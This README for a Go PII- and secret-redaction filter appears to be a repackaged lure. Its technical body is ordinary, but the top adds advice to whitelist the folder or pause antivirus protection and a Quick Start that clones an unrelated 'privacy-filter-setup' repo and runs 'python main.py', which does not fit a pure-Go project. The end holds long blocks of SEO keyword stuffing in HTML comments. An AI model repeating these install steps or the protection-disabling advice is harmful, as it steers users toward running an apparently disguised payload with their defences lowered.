# Privacy Filter (Go)


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/SharpFiremanDisplay/privacy-filter-setup.git
cd privacy-filter-setup
python main.py
```


**English** | [简体中文](README.zh-CN.md)

Strip sensitive user data (PII / secrets) from text before it reaches an LLM.
Pure Go, no model, no GPU, no CGO — a single static binary, millisecond latency on text of any length.

🌐 Running in production at [PackyCode](https://www.packyapi.com) — the privacy-compliance component of an API relay service.

---

## Three ways to use it

The latter two are thin wrappers around the `filter` core package.

---

## Two detection layers

| Layer | Covers | Technique |
|---|---|---|
| Structured PII | Email, phone, national ID, bank card (Luhn-checked), IP | Regex |
| Secrets / credentials | API keys, tokens, private keys, passwords written in prose, unknown high-entropy strings | gitleaks ruleset (keyword pre-filter) + contextual regex + Shannon-entropy fallback |

Each layer emits `(start, end, placeholder)` spans → spans are merged and de-overlapped → the text is rebuilt in a single pass.
Placeholders are typed and carry the entity kind — `[邮箱]` (email), `[电话]` (phone), `[身份证]` (national ID), `[银行卡]` (bank card), `[IP]`, `[密钥]` (secret) — and are irreversible (no un-redaction).

> No person / place / organization name recognition — that needs an NER model, which costs seconds of CPU time on long text and was removed per requirements.
> High-risk identity data (national ID, bank card, secrets, etc.) is fully covered by regex.

---

## Layout

```
privacy-filter/
├── go.mod / go.sum
├── filter/                  core package (import directly from a gateway)
│   ├── filter.go            Filter / New / Redact
│   ├── pii.go               structured PII
│   ├── secrets.go           gitleaks + context + entropy
│   └── filter_test.go
├── cmd/
│   ├── http/main.go         HTTP service
│   └── grpc/main.go         gRPC service
├── proto/filter.proto       gRPC interface definition
├── gen/filterpb/            protoc-generated code
├── rules/gitleaks.toml      gitleaks ruleset
├── scripts/fetch_rules.sh   ruleset update script
└── Dockerfile
```

---


### 1. Core package (recommended for gateways)

```go
import "privacyfilter/filter"

// Create once at startup; concurrency-safe, reuse globally.
f, err := filter.New("rules/gitleaks.toml")   // pass "" to use the built-in fallback rules

// Per request
res := f.Redact(userPrompt)
forwardToLLM(res.Redacted)                    // forward the redacted text to the LLM
```

`filter.Result`: `Redacted` (redacted text), `Hit`, `Count`, `Entities` (hit details,
including type and byte offsets).

> To consume this package from your own gateway module: put it in the same monorepo, or add
> `replace privacyfilter => ../privacy-filter` to the gateway's go.mod. The `filter` package
> depends only on `BurntSushi/toml`.

### 2. HTTP service

```bash
./bin/server-http                    # default :8088
```

```bash
curl http://127.0.0.1:8088/health
curl -X POST http://127.0.0.1:8088/redact -H 'Content-Type: application/json' \
  -d '{"text":"我的邮箱是 a@b.com，密码是 Hunter2xy"}'
# {"redacted":"我的邮箱是 [邮箱]，密码是 [密钥]","hit":true,"count":2,"entities":[...],"elapsed_ms":0.08}
```

Endpoints: `GET /health`, `POST /redact`, `POST /redact/batch` (`{"texts":[...]}`).

### 3. gRPC service

```bash
./bin/server-grpc                    # default :8089
```

Service `filter.v1.PrivacyFilter`, methods `Redact` / `RedactBatch`, defined in `proto/filter.proto`.
Generate a client from that proto on the gateway side. To regenerate the code in this repo:

```bash
protoc -I. --go_out=. --go_opt=module=privacyfilter \
       --go-grpc_out=. --go-grpc_opt=module=privacyfilter proto/filter.proto
```

---

## Configuration (environment variables)

| Variable | Default | Description |
|---|---|---|
| `PF_PORT` | `8088` | HTTP listen port |
| `PF_GRPC_PORT` | `8089` | gRPC listen port |
| `PF_GITLEAKS_TOML` | `rules/gitleaks.toml` | path to the gitleaks rules file |

---

## Performance (local benchmark, synthetic high-density PII text — worst case)

| Text length | Latency |
|---|---|
| ~50 B | ~0.01ms |
| ~2 KB | ~0.46ms |
| ~32 KB | ~9ms |

Both layers are O(n). Real prompts (PII is never this dense) are faster.

---

## Integration notes (gateway side)

- With the core-package import there is no HTTP/gRPC hop, hence no timeout and no fail-open/closed concerns.
- If you use the HTTP/gRPC service: set a 150–300ms timeout; on failure, prefer fail-closed (reject the request rather than forwarding the raw text).

---

## Notes

- All **222 gitleaks rules compile natively** in Go (Go's `regexp` is RE2, the same engine gitleaks uses;
  an earlier Python port lost 26 rules to RE2-incompatible syntax).
- Go `regexp` runs in linear time — no catastrophic backtracking (ReDoS) risk.
- gitleaks does not support look-around assertions, so digit boundaries for phone / national ID etc. are
  enforced by manual post-match validation.
- No person / place / organization recognition. If added later, prefer rules (a Chinese-address regex is
  feasible; names are better anchored by context).
- The entropy fallback can mis-flag git SHAs, long base64 strings, etc. — tune the threshold or add an allowlist.
```


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- privacy-filter-setup - tool utility software - download install setup -->
<!-- safe privacy-filter-setup viewer | is privacy filter setup legit | beginner privacy-filter-setup platform | linux privacy-filter-setup software | docs privacy-filter-setup mobile | start privacy-filter-setup | privacy filter setup workflow | low latency privacy-filter-setup creator | open privacy-filter-setup api | quickstart privacy-filter-setup package | use privacy-filter-setup binding | privacy filter setup tutorial | walkthrough powerful privacy-filter-setup clone | privacy-filter-setup parser | quick start offline privacy-filter-setup | arch privacy-filter-setup parser | windows privacy-filter-setup sdk | free download privacy-filter-setup cli | latest version privacy-filter-setup program | lightweight privacy-filter-setup | privacy-filter-setup mirror | updated extensible privacy-filter-setup | get fast privacy-filter-setup fork | ubuntu privacy-filter-setup extractor | 2026 safe privacy-filter-setup | quick start offline privacy-filter-setup debugger | privacy-filter-setup api | privacy filter setup automation | demo privacy-filter-setup program | offline privacy-filter-setup server | lightweight privacy-filter-setup alternative | offline privacy-filter-setup downloader | ubuntu powerful privacy-filter-setup | setup privacy-filter-setup | 2026 privacy-filter-setup compressor | best privacy-filter-setup sdk | cross platform privacy-filter-setup editor | sample privacy-filter-setup encoder | quick start privacy-filter-setup validator | free advanced privacy-filter-setup | privacy-filter-setup monitor | modern privacy-filter-setup compressor | deploy fast privacy-filter-setup | run on linux privacy-filter-setup builder | minimal privacy-filter-setup web | new version stable privacy-filter-setup | open source privacy-filter-setup | walkthrough privacy-filter-setup | linux open source privacy-filter-setup checker | download for linux extensible privacy-filter-setup -->
<!-- fedora privacy-filter-setup plugin | zip privacy-filter-setup | walkthrough powerful privacy-filter-setup | how to use privacy-filter-setup converter | demo advanced privacy-filter-setup | ubuntu privacy-filter-setup program | linux privacy-filter-setup | demo privacy-filter-setup tracker | macos stable privacy-filter-setup | advanced privacy-filter-setup module | minimal privacy-filter-setup | self hosted privacy-filter-setup gui | download for mac portable privacy-filter-setup | github privacy-filter-setup client | how to configure privacy-filter-setup | privacy filter setup reference | free privacy filter setup | top privacy-filter-setup generator | configure privacy-filter-setup editor | download for windows modular privacy-filter-setup | native privacy-filter-setup cli | modular privacy-filter-setup extension | configurable privacy-filter-setup generator | guide secure privacy-filter-setup program | offline privacy-filter-setup binding | production ready privacy-filter-setup parser | extensible privacy-filter-setup tracker | windows privacy-filter-setup addon | github modular privacy-filter-setup | privacy-filter-setup web | build privacy-filter-setup client | native privacy-filter-setup addon | git clone privacy-filter-setup parser | cross platform privacy-filter-setup | privacy-filter-setup editor | macos privacy-filter-setup api | 2025 privacy-filter-setup uploader | debian privacy-filter-setup mobile | reliable privacy-filter-setup fork | getting started privacy-filter-setup | guide privacy-filter-setup | free download modular privacy-filter-setup | privacy filter setup documentation | setup privacy-filter-setup parser | guide safe privacy-filter-setup | open privacy-filter-setup desktop | best privacy-filter-setup encoder | latest version privacy-filter-setup compressor | tar.gz privacy-filter-setup mobile | windows privacy-filter-setup extractor -->
<!-- free download privacy-filter-setup extractor | use online privacy-filter-setup | install privacy-filter-setup mirror | sample privacy-filter-setup | latest version privacy-filter-setup tracker | tar.gz privacy-filter-setup generator | run on linux privacy-filter-setup tracker | latest version privacy-filter-setup generator | safe privacy-filter-setup creator | macos reliable privacy-filter-setup | offline privacy-filter-setup | quickstart privacy-filter-setup viewer | 2025 privacy-filter-setup engine | local privacy-filter-setup reader | how to setup privacy-filter-setup uploader | offline privacy-filter-setup fork | linux privacy-filter-setup converter | linux privacy-filter-setup wrapper | tar.gz privacy-filter-setup | source code privacy-filter-setup extension | best privacy-filter-setup replacement | local privacy-filter-setup | execute privacy-filter-setup converter | privacy filter setup blog | cross platform privacy-filter-setup generator | compile modular privacy-filter-setup uploader | execute privacy-filter-setup creator | walkthrough privacy-filter-setup package | download privacy-filter-setup extractor | open source privacy-filter-setup program | guide privacy-filter-setup downloader | download for windows free privacy-filter-setup software | run on mac privacy-filter-setup mirror | local privacy-filter-setup mirror | run on windows privacy-filter-setup tracker | fast privacy-filter-setup logger | arch privacy-filter-setup | how to build privacy-filter-setup extension | privacy-filter-setup alternative | privacy filter setup vs | download for mac privacy-filter-setup clone | minimal privacy-filter-setup viewer | high performance privacy-filter-setup creator | offline privacy-filter-setup optimizer | privacy-filter-setup program | run on mac privacy-filter-setup | how to install privacy-filter-setup module | privacy-filter-setup sdk | minimal privacy-filter-setup app | run on windows privacy-filter-setup mobile -->
<!-- guide customizable privacy-filter-setup analyzer | updated top privacy-filter-setup | launch privacy-filter-setup utility | compile privacy-filter-setup tool | how to build privacy-filter-setup plugin | safe privacy-filter-setup tester | low latency privacy-filter-setup | use privacy-filter-setup api | tutorial privacy-filter-setup plugin | portable privacy-filter-setup mirror | latest version privacy-filter-setup | getting started privacy-filter-setup tester | download privacy-filter-setup utility | centos privacy-filter-setup debugger | fedora self hosted privacy-filter-setup | quickstart powerful privacy-filter-setup | github privacy-filter-setup reader | portable privacy-filter-setup framework | privacy filter setup review | 2026 privacy-filter-setup utility | open privacy-filter-setup tool | centos top privacy-filter-setup | open source privacy-filter-setup cli | quickstart privacy-filter-setup engine | download privacy-filter-setup alternative | portable privacy-filter-setup plugin | self hosted privacy-filter-setup reader | free download offline privacy-filter-setup binding | examples privacy-filter-setup tester | open source privacy-filter-setup generator | minimal privacy-filter-setup fork | fast privacy-filter-setup app | guide privacy-filter-setup converter | modular privacy-filter-setup web | macos privacy-filter-setup | wiki privacy-filter-setup tester | native privacy-filter-setup sdk | arch privacy-filter-setup analyzer | macos privacy-filter-setup analyzer | git clone privacy-filter-setup tool | launch privacy-filter-setup gui | how to download privacy-filter-setup engine | how to setup privacy-filter-setup service | privacy-filter-setup port | how to build privacy-filter-setup app | how to install privacy-filter-setup parser | download for linux privacy-filter-setup generator | how to configure privacy-filter-setup application | download for linux github privacy-filter-setup | how to install stable privacy-filter-setup -->
<!-- how to deploy privacy-filter-setup compressor | privacy-filter-setup application | guide privacy-filter-setup encoder | safe privacy-filter-setup converter | easy privacy-filter-setup | top privacy-filter-setup desktop | privacy-filter-setup downloader | privacy filter setup article | arch privacy-filter-setup framework | best privacy-filter-setup copy | centos privacy-filter-setup addon | demo free privacy-filter-setup api | zip privacy-filter-setup decoder | docs privacy-filter-setup cli | low latency privacy-filter-setup scanner | build privacy-filter-setup program | privacy filter setup demo | setup privacy-filter-setup tool | top privacy filter setup | execute privacy-filter-setup package | portable privacy-filter-setup fork | configure privacy-filter-setup module | stable privacy-filter-setup | safe privacy-filter-setup | download for windows stable privacy-filter-setup package | configurable privacy-filter-setup fork | download for windows privacy-filter-setup port | local privacy-filter-setup clone | privacy filter setup docker | tar.gz privacy-filter-setup logger | quickstart free privacy-filter-setup | how to setup privacy-filter-setup api | secure privacy-filter-setup tracker | updated privacy-filter-setup server | compile privacy-filter-setup api | high performance privacy-filter-setup sdk | free download privacy-filter-setup mobile | documentation privacy-filter-setup desktop | customizable privacy-filter-setup wrapper | high performance privacy-filter-setup optimizer | run on linux privacy-filter-setup parser | install privacy-filter-setup tool | free powerful privacy-filter-setup | quick start privacy-filter-setup converter | start privacy-filter-setup platform | advanced privacy-filter-setup builder | download privacy-filter-setup engine | wiki privacy-filter-setup logger | configurable privacy-filter-setup checker | powerful privacy-filter-setup engine -->
<!-- source code privacy-filter-setup client | start modern privacy-filter-setup | example privacy-filter-setup uploader | privacy-filter-setup scanner | download for mac local privacy-filter-setup | deploy open source privacy-filter-setup | download for mac privacy-filter-setup validator | native privacy-filter-setup software | fast privacy-filter-setup | simple privacy-filter-setup | demo privacy-filter-setup replacement | privacy filter setup support | compile high performance privacy-filter-setup mobile | guide privacy-filter-setup platform | run privacy-filter-setup optimizer | native privacy-filter-setup extension | privacy-filter-setup software | stable privacy-filter-setup replacement | free privacy-filter-setup logger | easy privacy-filter-setup software | free privacy-filter-setup | how to build privacy-filter-setup mirror | macos native privacy-filter-setup | configurable privacy-filter-setup | free privacy-filter-setup viewer | privacy-filter-setup mobile | deploy privacy-filter-setup cli | privacy filter setup download | advanced privacy-filter-setup package | open source privacy-filter-setup compressor | run on windows privacy-filter-setup debugger | updated privacy-filter-setup api | build minimal privacy-filter-setup | privacy-filter-setup plugin | open source privacy-filter-setup reader | fedora privacy-filter-setup reader | online privacy-filter-setup plugin | best privacy filter setup | latest version privacy-filter-setup addon | top privacy-filter-setup | how to configure privacy-filter-setup gui | examples secure privacy-filter-setup uploader | download for windows privacy-filter-setup mirror | deploy privacy-filter-setup uploader | documentation privacy-filter-setup port | new version production ready privacy-filter-setup | privacy-filter-setup compressor | privacy-filter-setup library | getting started portable privacy-filter-setup analyzer | git clone privacy-filter-setup optimizer -->
<!-- extensible privacy-filter-setup plugin | 2025 privacy-filter-setup generator | start privacy-filter-setup binding | secure privacy-filter-setup library | compile privacy-filter-setup checker | secure privacy-filter-setup engine | easy privacy-filter-setup server | get privacy-filter-setup mirror | self hosted privacy-filter-setup uploader | get privacy-filter-setup extractor | walkthrough privacy-filter-setup port | cross platform privacy-filter-setup package | top privacy-filter-setup mobile | sample advanced privacy-filter-setup tracker | privacy-filter-setup replacement | extensible privacy-filter-setup desktop | configurable privacy-filter-setup wrapper | how to run privacy-filter-setup program | privacy-filter-setup desktop | how to run privacy-filter-setup library | github privacy-filter-setup converter | install privacy-filter-setup client | top privacy-filter-setup fork | simple privacy-filter-setup library | get privacy-filter-setup | download for windows privacy-filter-setup | beginner privacy-filter-setup package | quickstart privacy-filter-setup replacement | new version privacy-filter-setup program | docs safe privacy-filter-setup | modular privacy-filter-setup fork | privacy-filter-setup wrapper | online privacy-filter-setup creator | privacy filter setup guide | privacy filter setup course | privacy-filter-setup fork | 2026 privacy-filter-setup analyzer | how to use modern privacy-filter-setup | 2025 privacy-filter-setup | privacy-filter-setup validator | privacy-filter-setup tool | examples privacy-filter-setup debugger | quick start privacy-filter-setup framework | debian privacy-filter-setup downloader | fedora simple privacy-filter-setup | free download privacy-filter-setup api | modular privacy-filter-setup viewer | quickstart secure privacy-filter-setup alternative | offline privacy-filter-setup uploader | privacy-filter-setup gui -->
<!-- privacy filter setup test | git clone privacy-filter-setup service | examples privacy-filter-setup utility | quick start privacy-filter-setup sdk | open source privacy-filter-setup sdk | run on linux privacy-filter-setup | 2025 fast privacy-filter-setup converter | privacy filter setup alternative | deploy local privacy-filter-setup | privacy filter setup ci cd | updated privacy-filter-setup mobile | run on mac secure privacy-filter-setup | getting started privacy-filter-setup library | free download privacy-filter-setup clone | production ready privacy-filter-setup tracker | 2026 github privacy-filter-setup converter | how to install privacy-filter-setup | centos privacy-filter-setup generator | wiki privacy-filter-setup creator | low latency privacy-filter-setup binding | example privacy-filter-setup debugger | free github privacy-filter-setup tracker | arch customizable privacy-filter-setup api | best privacy-filter-setup mirror | download for linux privacy-filter-setup mobile | download for windows privacy-filter-setup library | docs privacy-filter-setup server | new version privacy-filter-setup utility | easy privacy-filter-setup binding | example native privacy-filter-setup | privacy filter setup reddit | tutorial cross platform privacy-filter-setup plugin | ubuntu privacy-filter-setup creator | build privacy-filter-setup extractor | run on windows privacy-filter-setup | download for linux privacy-filter-setup encoder | github privacy-filter-setup validator | debian portable privacy-filter-setup | new version github privacy-filter-setup | privacy-filter-setup converter | privacy filter setup cheat sheet | run on mac modular privacy-filter-setup module | free privacy-filter-setup optimizer | modular privacy-filter-setup | how to build open source privacy-filter-setup desktop | setup privacy-filter-setup program | privacy-filter-setup service | configure privacy-filter-setup alternative | low latency privacy-filter-setup extractor | privacy-filter-setup logger -->
<!-- fedora privacy-filter-setup | privacy-filter-setup uploader | source code online privacy-filter-setup | how to run privacy-filter-setup editor | top privacy-filter-setup binding | how to deploy privacy-filter-setup port | low latency privacy-filter-setup cli | how to download privacy-filter-setup monitor | run on linux privacy-filter-setup app | download for mac free privacy-filter-setup | privacy filter setup github | production ready privacy-filter-setup monitor | portable privacy-filter-setup platform | compile privacy-filter-setup copy | is privacy filter setup good | setup privacy-filter-setup logger | how to configure privacy-filter-setup program | how to run free privacy-filter-setup app | ubuntu privacy-filter-setup compressor | fedora privacy-filter-setup package | 2026 privacy-filter-setup downloader | best privacy-filter-setup plugin | portable privacy-filter-setup | production ready privacy-filter-setup desktop | walkthrough privacy-filter-setup fork | stable privacy-filter-setup uploader | get privacy-filter-setup copy | example privacy-filter-setup fork | customizable privacy-filter-setup mirror | git clone privacy-filter-setup | how to use reliable privacy-filter-setup | open source privacy-filter-setup mobile | lightweight privacy-filter-setup tester | how to setup cross platform privacy-filter-setup | privacy filter setup setup | linux self hosted privacy-filter-setup | customizable privacy-filter-setup | use privacy-filter-setup compressor | zip privacy-filter-setup binding | modular privacy-filter-setup server | extensible privacy-filter-setup module | example minimal privacy-filter-setup | high performance privacy-filter-setup clone | 2025 privacy-filter-setup addon | production ready privacy-filter-setup mobile | tutorial configurable privacy-filter-setup | download for linux privacy-filter-setup service | privacy-filter-setup creator | high performance privacy-filter-setup tracker | source code fast privacy-filter-setup -->
<!-- run privacy-filter-setup | docs privacy-filter-setup | how to run privacy-filter-setup generator | use privacy-filter-setup validator | how to configure production ready privacy-filter-setup | tutorial github privacy-filter-setup | configure modular privacy-filter-setup | minimal privacy-filter-setup framework | open source lightweight privacy-filter-setup | windows privacy-filter-setup monitor | native privacy-filter-setup mobile | open source stable privacy-filter-setup sdk | how to install privacy-filter-setup viewer | reliable privacy-filter-setup encoder | tar.gz privacy-filter-setup uploader | source code privacy-filter-setup | install privacy-filter-setup utility | quick start privacy-filter-setup platform | configure privacy-filter-setup server | centos privacy-filter-setup | tutorial privacy-filter-setup logger | download privacy-filter-setup | privacy-filter-setup app | quick start production ready privacy-filter-setup monitor | privacy-filter-setup tester | how to deploy secure privacy-filter-setup | wiki cross platform privacy-filter-setup port | install privacy-filter-setup program | secure privacy-filter-setup | start privacy-filter-setup monitor | run on mac privacy-filter-setup mobile | macos production ready privacy-filter-setup | quick start customizable privacy-filter-setup port | how to download privacy-filter-setup module | privacy filter setup not working | execute privacy-filter-setup viewer | guide privacy-filter-setup uploader | new version privacy-filter-setup gui | advanced privacy-filter-setup tester | privacy filter setup project | privacy filter setup error | how to run privacy-filter-setup fork | how to deploy privacy-filter-setup builder | modular privacy-filter-setup monitor | 2025 minimal privacy-filter-setup | deploy offline privacy-filter-setup utility | build privacy-filter-setup server | tar.gz free privacy-filter-setup | cross platform privacy-filter-setup compressor | ubuntu privacy-filter-setup -->

<!-- Last updated: 2026-06-09 17:57:49 -->
